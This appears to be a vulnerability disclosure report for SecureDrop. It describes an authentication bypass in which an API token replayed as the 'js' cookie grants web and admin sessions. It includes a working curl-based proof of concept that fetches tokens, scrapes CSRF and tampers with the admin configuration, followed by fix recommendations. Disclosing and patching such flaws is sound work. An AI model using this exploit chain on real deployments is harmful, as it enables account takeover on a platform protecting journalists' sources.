
# Security Vulnerability Report: API Token Replay Authentication Bypass

## A. Vulnerability Summary

A valid API bearer token can be replayed as the `js` cookie to access web-authenticated routes, breaking the separation between API authentication and web session authentication.

**Severity:** High  
**Type:** Authentication Bypass  
**Attack Vector:** Network  
**Complexity:** Low

---

## B. Root Cause Analysis

The vulnerability exists in `sessions.py` due to improper state management in the session handler.

### Technical Details

**Line 133 (API Request Handler):**
```python
self.key_prefix = self.api_key_prefix
self.salt = self.api_salt
```

API requests mutate shared instance state by setting the key prefix and salt to API-specific values.

**Line 144 (Non-API Request Handler):**

For non-API requests, these values are **not reset** to web defaults.

**Lines 148, 154 (Cookie Verification):**

Non-API cookie verification and Redis lookup still use the API salt/prefix values from the previous request state.

### Result

An API token value can be accepted as a `js` cookie in web authentication flows because the verification logic inadvertently uses API authentication parameters.

---

## C. Real-World Impact

### Attack Scenarios

1. **Standard User Compromise:**
   - If an attacker obtains any user's API token, they can authenticate to web routes as that user
   - Bypasses login form and 2FA requirements
   - Full session access without proper authentication flow

2. **Administrative Privilege Escalation:**
   - If the stolen token belongs to an admin user, the attacker gains access to:
     - User management functionality
     - Password reset capabilities
     - System configuration controls
     - Account deletion/modification

### Business Impact

- Complete authentication bypass
- Unauthorized access to sensitive web functionality
- Potential data breach
- Regulatory compliance violations (depending on data handled)
- Reputational damage

---

## D. Step-by-Step Reproduction

### Prerequisites

- Valid API token stored in `$TOKEN` environment variable
- Access to the application endpoint

For this test, I used the following command to get token:

```bash
──(keshav㉿kali)-[~/Downloads/securedrop]
└─$ BASE=http://127.0.0.1:8081

# 1) Get OTP (dev seed used by loaddata users, including dellsberg)
OTP=$(oathtool --totp --base32 JHCOGO7VCER3EJ4L)

# 2) Get API token
RESP=$(curl -sS -X POST "$BASE/api/v1/token" \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"dellsberg\",\"passphrase\":\"correct horse battery staple profanity oil chewy\",\"one_time_code\":\"$OTP\"}")

echo "$RESP"

TOKEN=$(echo "$RESP" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("token",""))')
echo "TOKEN_LEN=${#TOKEN}"

# 3) Token sanity check (must be 200)
curl -i -s "$BASE/api/v1/user" -H "Authorization: Token $TOKEN" | head -n 20

```

Terminal output:
```bash
{
  "expiration": "2026-02-17T01:56:00.206238+00:00", 
  "journalist_first_name": null, 
  "journalist_last_name": null, 
  "journalist_uuid": "92d08e5f-9116-4023-8dd0-045389dad120", 
  "token": "IkQwZW1sMjF5YXlDNjJFQkRUTDluRjA0b1h4SUxwYy1KT0tkN1ZTRUhxS1Ui.aZOukA.zvR8upLCWnHK9dykdHswffpFhx8"
}
TOKEN_LEN=95
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.12.3
Date: Mon, 16 Feb 2026 23:56:00 GMT
Content-Type: application/json
Content-Length: 195
Connection: close

{
  "first_name": null, 
  "is_admin": false, 
  "last_login": "2026-02-16T23:56:00.206403", 
  "last_name": null, 
  "username": "dellsberg", 
  "uuid": "92d08e5f-9116-4023-8dd0-045389dad120"
}

```

### Reproduction Steps

# For User account:

#### 1. Set Environment Variables

```bash
BASE=http://127.0.0.1:8081
AUTH="Authorization: Token $TOKEN"
```

#### 2. Confirm Token Validity

```bash
curl -i -s "$BASE/api/v1/user" -H "$AUTH" | head -n 12
```


Terminal output:
```bash
──(keshav㉿kali)-[~/Downloads/securedrop]
└─$ curl -i -s "$BASE/api/v1/user" -H "$AUTH" | head -n 12

HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.12.3
Date: Mon, 16 Feb 2026 23:56:17 GMT
Content-Type: application/json
Content-Length: 195
Connection: close

{
  "first_name": null, 
  "is_admin": false, 
  "last_login": "2026-02-16T23:56:00.206403", 
  "last_name": null, 
                                              
```

**Expected Result:** HTTP/1.1 200 OK

#### 3. Trigger API Mode State Change

```bash
curl -s "$BASE/api/v1/" > /dev/null
```

This forces an API request, flipping the session interface into API mode due to mutable state.

#### 4. Replay API Token as Web Cookie

```bash
curl -i -s "$BASE/account/account" \
  -H "Cookie: js=$TOKEN" | head -n 20
```

Terminal output:

```bash
──(keshav㉿kali)-[~/Downloads/securedrop]
└─$ curl -i -s "$BASE/account/account" \
  -H "Cookie: js=$TOKEN" | head -n 20

HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.12.3
Date: Mon, 16 Feb 2026 23:56:32 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 14007
Connection: close

<!DOCTYPE html>
<html lang="en-US" dir="ltr">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Edit your account
 | SecureDrop</title>

  <link rel="stylesheet" href="/static/css/journalist.css">

  <link rel="icon" type="image/png" href="/static/i/favicon.png">



```

#### 5. Verify Exploitation Success

**Vulnerable System Response:**
- HTTP 200 OK
- Account page HTML content returned

**Patched System Response:**
- HTTP 302 redirect to `/login`


-----
# For Admin Level Account  Verification

Steps to reproduce:

1. Get an admin API token (dev default account)
From loaddata.py, default admin is journalist with same password/OTP seed.
```bash
┌──(keshav㉿kali)-[~/Downloads/securedrop]
└─$ BASE=http://127.0.0.1:8081
PASS='correct horse battery staple profanity oil chewy'
OTP_SEED='JHCOGO7VCER3EJ4L'

OTP=$(oathtool --totp --base32 "$OTP_SEED")
ADMIN_RESP=$(curl -sS -X POST "$BASE/api/v1/token" \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"journalist\",\"passphrase\":\"$PASS\",\"one_time_code\":\"$OTP\"}")

echo "$ADMIN_RESP"
ADMIN_TOKEN=$(echo "$ADMIN_RESP" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("token",""))')
echo "ADMIN_TOKEN_LEN=${#ADMIN_TOKEN}"

```
My terminal output:

```bash
{
  "expiration": "2026-02-17T02:09:07.174324+00:00", 
  "journalist_first_name": null, 
  "journalist_last_name": null, 
  "journalist_uuid": "3cdca50b-83e5-493f-8e21-8a6e5ee65979", 
  "token": "ImNCZXdPVTltNmp3djV6M3JTeHZaWXA5NnBGVGJ2V1NudHhYUFFiS0c1U0Ui.aZOxog.b_ZieElUyqor_PXUro5FSzi4fz8"
}
ADMIN_TOKEN_LEN=95

```



Check it is admin:
```bash
curl -s "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN" | jq
```
You should see "is_admin": true.

My terminal output:

```bash
┌──(keshav㉿kali)-[~/Downloads/securedrop]
└─$ curl -s "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN" | jq

{
  "first_name": null,
  "is_admin": true,
  "last_login": "2026-02-17T00:09:07.174585",
  "last_name": null,
  "username": "journalist",
  "uuid": "3cdca50b-83e5-493f-8e21-8a6e5ee65979"
}

```


2. Prove admin web takeover using only stolen token
```bash
curl -s "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN" >/dev/null
curl -i -s "$BASE/admin/" -H "Cookie: js=$ADMIN_TOKEN" | head -n 20
```
If vulnerable, this is 1.1 200 OK and admin HTML.

My terminal output:

```bash
┌──(keshav㉿kali)-[~/Downloads/securedrop]
└─$ curl -s "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN" >/dev/null
curl -i -s "$BASE/admin/" -H "Cookie: js=$ADMIN_TOKEN" | head -n 20

HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.12.3
Date: Tue, 17 Feb 2026 00:09:20 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 12912
Connection: close

<!DOCTYPE html>
<html lang="en-US" dir="ltr">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Admin Interface | SecureDrop</title>

  <link rel="stylesheet" href="/static/css/journalist.css">

  <link rel="icon" type="image/png" href="/static/i/favicon.png">

  <!-- nosemgrep: generic.html-templates.security.unquoted-attribute-var.unquoted-attribute-var -->
                                                                                
```



3. Prove config tampering (safe demo)
Fetch CSRF from admin config page with stolen cookie-session:
```bash
CSRF_CFG=$(curl -s "$BASE/admin/config" -H "Cookie: js=$ADMIN_TOKEN" | python3 -c '
import re,sys
h=sys.stdin.read()
m=re.search(r"name=\"csrf_token\"[^>]*value=\"([^\"]+)\"", h) or re.search(r"value=\"([^\"]+)\"[^>]*name=\"csrf_token\"", h)
print(m.group(1) if m else "")
')
echo "$CSRF_CFG"
```

My terminal output:
```bash
┌──(keshav㉿kali)-[~/Downloads/securedrop]
└─$ CSRF_CFG=$(curl -s "$BASE/admin/config" -H "Cookie: js=$ADMIN_TOKEN" | python3 -c '
import re,sys
h=sys.stdin.read()
m=re.search(r"name=\"csrf_token\"[^>]*value=\"([^\"]+)\"", h) or re.search(r"value=\"([^\"]+)\"[^>]*name=\"csrf_token\"", h)
print(m.group(1) if m else "")
')
echo "$CSRF_CFG"

IjRmYTZjZmRmZjhlODMwNDI2YWEwNGY1MzU2YTFhMTRlMTA3MDNhNmYi.aZOxvQ.YOvuuiJQwsb3Js868y7IoQnVMho

```


3.1) Change org name:
```bash
NEW_ORG="PWNED-$(date +%s)"
curl -i -s -X POST "$BASE/admin/update-org-name" \
  -H "Cookie: js=$ADMIN_TOKEN" \
  --data-urlencode "csrf_token=$CSRF_CFG" \
  --data-urlencode "organization_name=$NEW_ORG" | head -n 15
```

My terminal output:

```bash
┌──(keshav㉿kali)-[~/Downloads/securedrop]
└─$ NEW_ORG="PWNED-$(date +%s)"
curl -i -s -X POST "$BASE/admin/update-org-name" \
  -H "Cookie: js=$ADMIN_TOKEN" \
  --data-urlencode "csrf_token=$CSRF_CFG" \
  --data-urlencode "organization_name=$NEW_ORG" | head -n 15

HTTP/1.1 302 FOUND
Server: Werkzeug/2.2.3 Python/3.12.3
Date: Tue, 17 Feb 2026 00:09:40 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 243
Location: /admin/config#config-orgname
Connection: close

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/admin/config#config-orgname">/admin/config#config-orgname</a>. If not, click the link.


```

Verify:
```bash
curl -s "$BASE/admin/config" -H "Cookie: js=$ADMIN_TOKEN" | grep -F "$NEW_ORG" && echo "CONFIG_TAMPER_SUCCESS"
```

My terminal Output:
```bash
┌──(keshav㉿kali)-[~/Downloads/securedrop]
└─$ curl -s "$BASE/admin/config" -H "Cookie: js=$ADMIN_TOKEN" | grep -F "$NEW_ORG" && echo "CONFIG_TAMPER_SUCCESS"

  <title>Instance Configuration | PWNED-1771286980</title>
            alt="PWNED-1771286980 logo" width="250"></a>
    <div><input id="organization_name" name="organization_name" required type="text" value="PWNED-1771286980"></div>
  <img id="current-logo" src="/static/i/logo.png" class="logo small" alt="PWNED-1771286980" width="250">
CONFIG_TAMPER_SUCCESS
                       
```

<img width="1495" height="929" alt="image" src="https://github.com/user-attachments/assets/5ea35d34-0ab1-4d09-a4ad-7cfe09939ce1" />


4. Password reset abuse from admin account for a user account:
   


---

## E. Exploit Chain Possibilities

### Attack Chain

```
Token Theft/Exposure
    ↓
API Token Replay as Web Cookie
    ↓
Web Session Takeover
    ↓
[If Admin Token] Admin UI Access
    ↓
Malicious Actions:
  - Password resets
  - User deletion
  - Configuration tampering
  - Data exfiltration
```

### Token Acquisition Methods

An attacker might obtain API tokens through:
- Log file exposure
- Insecure storage
- Network interception
- Insider threat
- Application vulnerability (XSS, SSRF, etc.)
- Source code repository exposure
- Backup file leakage

---

## F. Recommendations

### Immediate Actions

1. **Deploy Emergency Patch:**
   - Reset session state properly for non-API requests
   - Ensure `key_prefix` and `salt` revert to web defaults

2. **Rotate All API Tokens:**
   - Force regeneration of all active API tokens
   - Notify users of the security measure

3. **Audit Access Logs:**
   - Review for suspicious authentication patterns
   - Look for API tokens used in cookie headers

### Code Fix Example

```python
# Line 144 - Add state reset for non-API requests
def handle_non_api_request(self):
    # Reset to web authentication defaults
    self.key_prefix = self.web_key_prefix
    self.salt = self.web_salt
    # Continue with normal processing...
```

### Long-Term Mitigations

1. **Implement Separate Authentication Contexts:**
   - Use distinct session handlers for API vs. web
   - Avoid shared mutable state

2. **Add Context Validation:**
   - Verify authentication method matches endpoint type
   - Reject API tokens on web routes explicitly

3. **Implement Token Binding:**
   - Bind tokens to specific contexts (API-only, web-only)
   - Include token type metadata in verification

4. **Security Testing:**
   - Add automated tests for authentication boundary violations
   - Include this scenario in penetration testing scope

5. **Monitoring & Detection:**
   - Alert on authentication method mismatches
   - Monitor for unusual authentication patterns

---

## G. References

- **Affected File:** `sessions.py`
- **Critical Lines:** 133, 144, 148, 154
- **CWE-287:** Improper Authentication
- **CWE-384:** Session Fixation

---

**Report Generated:** 2026-02-16  
**Classification:** CONFIDENTIAL - SECURITY SENSITIVE
